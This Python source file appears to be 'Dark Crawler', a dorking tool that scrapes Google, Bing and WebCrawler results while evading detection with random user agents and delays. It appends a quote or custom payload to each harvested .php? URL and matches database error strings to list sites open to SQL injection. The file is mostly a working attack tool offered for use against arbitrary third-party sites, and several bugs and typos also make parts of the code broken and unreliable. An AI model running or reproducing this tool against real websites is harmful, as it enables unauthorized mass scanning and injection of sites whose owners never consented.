from lib.colorama import *
import sys
import os
import requests
from bs4    import BeautifulSoup
from optparse import *
from functools import partial
from  time import time as timer
import re
from urllib.parse import urlparse
import urllib.request , urllib.error
from multiprocessing import Pool, freeze_support
import multiprocessing
import textwrap
import random
from random import randint
from time import sleep
from urllib.error import HTTPError, URLError
import socket




class msg :
    def info(string) :
        init()
        print(Fore.GREEN + '[INFO] ' + string + Fore.RESET ,end='\n')

    def warning(string) :
        init()
        print(Fore.YELLOW + '[WARNING] ' + string + Fore.RESET, end='\n')

    def error(string) :
        init()
        print(Fore.RED + '[ERROR] ' + string + Fore.RESET, end='\n')

    def blue(string) :
        init()
        print(Fore.BLUE + string + Fore.RESET, end='\n')

    def shutdown() :
        init()
        print(Back.RED + '\nSHUTTING DOWN DARK CRAWLER' + Back.RESET , end='\n')

def random_ua() :
    dir_path = os.path.dirname(os.path.realpath(__file__))
    lines = open(dir_path +'/core/header').read().splitlines()
    myline =random.choice(lines)
    return myline

def random_delay() :
    delay = randint(0,10)
    return delay

def filter(list) :
    filter_res = []
    final = []
    for x in list :
        match = re.search(r'.php\?', x)
        if match :
            filter_res.append(x)
    final = dict((urlparse(u).netloc, u) for u in filter_res).values()
    return final

class sqli :
    def inject(list, custom_payload, verbose) :
        sleep(1)
        msg.info('Running basic SQL Injection')
        sleep(1)
        msg.info('Displaying Confirmed urls with SQLI ')
        sleep(1)
        if custom_payload != None :
            payload = custom_payload
        else :
            payload = "'"
        vuln_list = []
        for x in list :
            try :
                resp = urllib.request.urlopen(x+payload, timeout=10)
            except HTTPError as error:
                if verbose == True :
                    msg.error(str(error)+' In '+x)
                    log_error(str(error)+' In '+x)
                else :
                    log_error(str(error)+' In '+x)
            except URLError as error:
                if isinstance(error.reason, socket.timeout):
                    if verbose == True :
                        msg.error('socket timed out - URL '+ x)
                        log_error('socket timed out - URL '+ x)
                    else :
                        log_error('socket timed out - URL '+ x)
            except socket.error as emsg:
                if verbose == True :
                    msg.error(emsg + ' In ' + x)
                    log_error(emsg + ' In ' + x)
                else :
                    log_error(str(emsg) + ' In ' + x)
            hits = str(resp.read())
            if str("error in your SQL syntax") in hits:
                print(x + " is vulnerable --> MySQL Classic")
                vuln_list.append(x)
                pass
            elif str("mysql_fetch") in hits:
                print(x + " is Vulnerable --> MiscError")
                vuln_list.append(x)
                pass
            elif str("num_rows") in hits:
                print(x + " is Vulnerable --> MiscError2")
                vuln_list.append(x)
                pass
            elif str("ORA-01756") in hits:
                print(x + " is Vulnerable --> Oracle")
                vuln_list.append(x)
                pass
            elif str("Error Executing Database Query") in hits:
                print(x + " is Vulnerable --> JDBC_CFM")
                vuln_list.append(x)
                pass
            elif str("SQLServer JDBC Driver") in hits:
                print(x + " is Vulnerable --> JDBC_CFM2")
                vuln_list.append(x)
                pass
            elif str("OLE DB Provider for SQL Server") in hits:
                print(x + " is Vulnerable --> MSSQL_OLEdb")
                vuln_list.append(x)
                pass
            elif str("Unclosed quotation mark") in hits:
                print(x + " is Vulnerabe --> MSSQL_Uqm")
                vuln_list.append(x)
                pass
            elif str("ODBC Microsoft Access Driver") in hits:
                print(x + " is Vulnerable --> MS-Access_ODBC")
                vuln_list.append(x)
                pass
            elif str("Microsoft JET Database") in hits:
                print(x + " is Vulnerable --> MS-Access_JETdb")
                vuln_list.append(x)
                pass
            elif str("Error Occurred While Processing Request") in hits:
                print(x + " is Vulnerable --> Processing Request")
                vuln_list.append(x)
                pass
            elif str("Microsoft JET Database") in hits:
                print(x + " is Vulnerable --> MS-Access JetDb")
                vuln_list.append(x)
                pass
            elif str("Error Occurred While Processing Request") in hits:
                print(x + " is Vulnerable --> Processing Request ")
                vuln_list.append(x)
                pass
            elif str("Server Error") in hits:
                print(x + " is Vulnerable --> Server Error")
                vuln_list.append(x)
                pass
            elif str("ODBC Drivers error") in hits:
                print(x + " is Vulnerable --> ODBC Drivers error")
                vuln_list.append(x)
                pass
            elif str("Invalid Querystring") in hits:
                print(x + " is Vulnerable --> Invalid Querystring")
                vuln_list.append(x)
                pass
            elif str("OLE DB Provider for ODBC") in hits:
                print(x + " is Vulnerable --> OLE DB Provider for ODBC")
                vuln_list.append(x)
                pass
            elif str("VBScript Runtime") in hits:
                print(x + " is Vulnerable --> VBScript Runtime")
                vuln_list.append(x)
                pass
            elif str("ADODB.Field") in hits:
                print(x + " is Vulnerable --> ADODB.Field")
                vuln_list.append(x)
                pass
            elif str("BOF or EOF") in hits:
                print(x + " is Vulnerable --> BOF or EOF")
                vuln_list.append(x)
                pass
            elif str("ADODB.Command") in hits:
                print(x + " is Vulnerable --> ADODB.Command")
                vuln_list.append(x)
                pass
            elif str("JET Database") in hits:
                print(x + " is Vulnerable --> JET Database")
                vuln_list.append(x)
                pass
            elif str("mysql_fetch_array") in hits:
                print(x + " is Vulnerabe --> mysql_fetch_array")
                vuln_list.append(x)
                pass
            elif str("Syntax error") in hits:
                print(x + " is Vulnerable --> Syntax error")
                vuln_list.append(x)
                pass
            elif str("mysql_numrows()") in hits:
                print(x + " is Vulnerable --> mysql_numrows()")
                vuln_list.append(x)
                pass
            elif str("GetArray()") in hits:
                print(x + " is Vulnerable --> GetArray()")
                vuln_list.append(x)
                pass
            elif str("FetchRow()") in hits:
                print(x + " is Vulnerable --> FetchRow()")
                vuln_list.append(x)
                pass
            elif str("Input string was not in a correct format") in hits:
                print(x + " is Vulnerable --> Input String Error")
                vuln_list.append(x)
                pass
            else:
                pass
        return vuln_list


class google :
    def get_urls(search_string, start):
        temp        = []
        url         = 'http://www.google.com/search'
        payload     = { 'q' : search_string, 'start' : start }
        my_headers  = { 'User-agent' : random_ua() }
        sleep(random_delay())
        r           = requests.get( url, params = payload, headers = my_headers )
        soup        = BeautifuImportErrorlSoup( r.text, 'html.parser' )
        h3tags      = soup.find_all( 'h3', class_='r' )
        for h3 in h3tags:
            try:
                temp.append( re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1) )
            except:
                continue
        return temp

    def dork_scanner(search, pages, processes):
        result      = []
        search      = search
        pages       = pages
        processes   = int(processes)
        msg.info('Using random delays to avoid google\'s detection')
        make_request = partial( google.get_urls, search )
        pagelist     = [ str(x*10) for x in range( 0, int(pages) ) ]
        with Pool(processes) as p:
            tmp = p.map(make_request, pagelist)
            freeze_support()
        for x in tmp:
            result.extend(x)
        result = list( set( result ) )
        return result


class bing :
    def get_urls(search_string, start):
        temp        = []
        url         = 'https://www.bing.com/search'
        payload     = { 'q' : search_string, 'first' : start }
        my_headers  = { 'User-agent' : random_ua() }
        sleep(random_delay())
        r           = requests.get( url, params = payload, headers = my_headers )
        soup        = BeautifulSoup( r.text, 'html.parser' )
        h3tags      = soup.find_all( 'li', class_='b_algo' )

        for h3 in h3tags:
            try:
                temp.append(h3.find('a').attrs['href'])
            except:
                continue
        return temp

    def dork_scanner(search, pages, processes):
        result      = []
        search      = search
        pages       = pages
        processes   = int(processes)
        msg.info('Using random delays to avoid bing\'s detection')
        make_request = partial( bing.get_urls, search )
        pagelist     = [ str(x*10) for x in range( 0, int(pages) ) ]
        with Pool(processes) as p:
            tmp = p.map(make_request, pagelist)
            freeze_support()
        for x in tmp:
            result.extend(x)
        result = list( set( result ) )
        return result

class webcrawler :
    def get_urls(search_string, start):
        temp        = []
        url         = 'http://www.webcrawler.com/serp'
        payload     = { 'q' : search_string, 'page' : start }
        my_headers  = { 'User-agent' : random_ua() }
        sleep(random_delay())
        r = requests.get( url, params = payload, headers = my_headers )
        soup        = BeautifulSoup( r.text, 'html.parser' )
        h3tags      = soup.find_all( 'div', class_='web-bing__result' )
        for h3 in h3tags:
            try:
                temp.append(h3.find('a').attrs['href'])
            except:
                continue
        return temp

    def dork_scanner(search, pages, processes):
        result      = []
        search      = search
        pages       = pages
        processes   = int(processes)
        msg.info('Using random delays to avoid webcrawler\'s detection')
        make_request = partial( webcrawler.get_urls, search )
        pagelist     = [ str(x) for x in range( 0, int(pages) ) ]
        with Pool(processes) as p:
            tmp = p.map(make_request, pagelist)
            freeze_support()
        for x in tmp:
            result.extend(x)
        result = list( set( result ) )
        return result


class google_c :
    def get_urls(search_string, start):
        temp        = []
        url         = 'http://webcache.googleusercontent.com/search'
        payload     = { 'q' : 'cache:'+search_string+'/', 'start' : start }
        my_headers  = { 'User-agent' : user_agent }
        sleep(random_delay())
        r           = requests.get( url, params = payload, headers = my_headers )
        soup        = BeautifulSoup( r.text, 'html.parser' )
        h3tags      = soup.find_all( 'h3', class_='r' )
        for h3 in h3tags:
            try:
                temp.append( re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1) )
            except:
                continue
        return temp

    def dork_scanner(search, pages, processes):
        result      = []
        search      = search
        pages       = pages
        processes   = int(processes)
        msg.info('Using random delays to avoid google cache\'s detection')
        make_request = partial( google.get_urls, search )
        pagelist     = [ str(x*10) for x in range( 0, int(pages) ) ]
        with Pool(processes) as p:
            tmp = p.map(make_request, pagelist)
            freeze_support()
        for x in tmp:
            result.extend(x)
        result = list( set( result ) )
        return result

def log_error(error) :
    with open('errors', 'a') as file :
        file.write(error + '\n')
    file.close()

def save_output(results, filename) :
    with open(filename, 'w') as file:
        for x in results :
            file.write(x + '\n')
    file.close()

def append_sqli(results) :
    with open('sqli_confirmed', 'a') as file :
        for x in results :
            file.write(x+'\n')
    file.close()

def print_list(list) :
    for x in list :
        print(x)

def banner() :
    print(Fore.YELLOW + Style.BRIGHT +"""
 ╔╦╗┌─┐┬─┐┬┌─  ╔═╗┬─┐┌─┐┬ ┬┬  ┌─┐┬─┐
  ║║├─┤├┬┘├┴┐  ║  ├┬┘├─┤││││  ├┤ ├┬┘
 ═╩╝┴ ┴┴└─┴ ┴  ╚═╝┴└─┴ ┴└┴┘┴─┘└─┘┴└─
    """+Fore.RESET)
    print(Fore.GREEN + Style.NORMAL  +'Developed by Aman pachauri (paradox47.blogspot.com)'+Fore.RESET)
    print(Fore.BLUE + Style.NORMAL+'\t\t\t\tversion [2.4-stable]\n\n'+ Fore.RESET)

def main() :
    banner()
    usage = "usage: %prog [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-d","--dork", type="string", dest="dork", metavar="DORK", action="store", help="String to search [eg:- index.php?id=]")
    parser.add_option("--engine", type="string", dest="engine",metavar="bing", action="store",default="all",help="Search engine to use [google,bing,webcrawler]")
    parser.add_option("--pages",type="int",dest="pages",metavar='2',action="store",default="2",help="Number of pages to scan")
    parser.add_option("--domain",type="string",dest="domain",action="store",help="Specify domain for specific results eg IN,example.com")
    parser.add_option("--output",type="string",dest="ofile",metavar="file.txt",help='''Save ouput to file''')
    parser.add_option("--threads",type="int",dest="processes",metavar="2",default="7",help="Number of parallel processes")
    group_injection = OptionGroup(parser, "Injection Test")
    group_injection.add_option("--sqli",dest='sqli',action="store_true",help="Checks gathered urls for classic sql injection")
    group_injection.add_option("--custom-payload",dest="c_payload",action="store",metavar=" ", help="Custom payload to test against URLs")
    parser.add_option_group(group_injection)
    group_misc = OptionGroup(parser, "Misc")
    group_misc.add_option("--no-filter", dest="filter", action="store_true", help="Turn Off URL filter(gives interesting results)")
    group_misc.add_option("-v", dest="verbose", action="store_true", help="Display error messages on screen")
    parser.add_option_group(group_misc)
    (options, args) = parser.parse_args()
    engine = options.engine
    search = options.dork
    pages = options.pages
    domain = options.domain
    filter_op = options.filter
    processes = options.processes
    file = options.ofile
    sqli_op = options.sqli
    custom_payload = options.c_payload
    verbose = options.verbose
    if options.sqli and options.ofile:
        parser.error("options --sqli and --output should not used together")
        exit()
    if options.sqli :
        display = 0
    else :
        display = 1
    if options.dork != None :
        msg.info('Starting Crawler')
        sleep(1)
        msg.blue('[ENGINE] '+ engine)
        msg.warning('Excess use of this tool can get your IP address banned and you may get 0 or false results ')
        start = timer()
        if engine == "google" :
            if domain != None :
                search = str(search + ' SITE:'+ domain)
            result_c = google_c.dork_scanner(search, pages, processes)
            result_g = google.dork_scanner(search, pages, processes)
            result = result_c + result_g
            if not result :
                msg.error('It seems like google has BANNED your IP ADDRESS. we recommend you use different engine [--engine=] or search google using browser')
            else :
                if filter_op == None :
                    result = filter(result)
                if sqli_op == True :
                    list = sqli.inject(result, custom_payload, verbose)
                    append_sqli(list)
                    msg.info('Urls written to sqli_confirmed')
                if file != None :
                    save_output(result, file)
                    msg.info('Urls written to '+ file)
            msg.shutdown()
        elif engine == "bing" :
            if domain != None :
                search = str(search + ' SITE:'+ domain)
            result = bing.dork_scanner(search, pages, processes)
            if not result :
                msg.error('It seems like bing has BANNED your IP ADDRESS. we recommend you use different engine [--engine=] or search bing using browser')
            else:
                if filter_op != True :
                    result = filter(result)
                if sqli_op == True :
                    list = sqli.inject(result, custom_payload, verbose)
                    append_sqli(list)
                    msg.info('Urls written to sqli_confirmed')
                if display == 1 :
                    print_list(result)
                if file != None :
                    save_output(result, file)
                    msg.info('Urls written to '+ file)
            msg.shutdown()
        elif engine == "all" :
            if domain != None :
                search = str(search + ' SITE:'+ domain)
            result_wc = webcrawler.dork_scanner(search,pages,processes)
            result_b = bing.dork_scanner(search, pages, processes)
            result = result_wc + result_b
            if not result :
                msg.error('It seems like your IP ADDRESS is BANNED. we recommend you use different engine [--engine=] or use browser')
            else :
                if filter_op != True :
                    result = filter(result)
                if sqli_op == True :
                    list = sqli.inject(result, custom_payload, verbose)
                    append_sqli(list)
                    msg.info('Urls written to sqli_confirmed')
                if display == 1 :
                    print_list(result)
                if file != None :
                    save_output(result, file)
                    msg.info('Urls written to '+ file)
            msg.shutdown()
        elif engine == "webcrawler" :
            if domain != None :
                search = str(search + ' SITE:'+ domain)
            result = webcrawler.dork_scanner(search, pages, processes)
            if not result :
                msg.error('It seems like Web-crawler has BANNED your IP ADDRESS. we recommend you use different engine [--engine=] or search webcrawler using browser')
            else:
                if filter_op != True :
                    result = filter(result)
                if sqli_op == True :
                    list = sqli.inject(result, custom_payload, verbose)
                    append_sqli(list)
                    msg.info('Urls written to sqli_confirmed')
                if display == 1 :
                    print_list(result)
                if file != None :
                    save_output(result, file)
                    msg.info('Urls written to '+ file)
            msg.shutdown()
        else :
            msg.error("\nInvalid Engine")
            msg.shutodwn()
    else :
        parser.print_help()


if __name__ == '__main__':
    main()
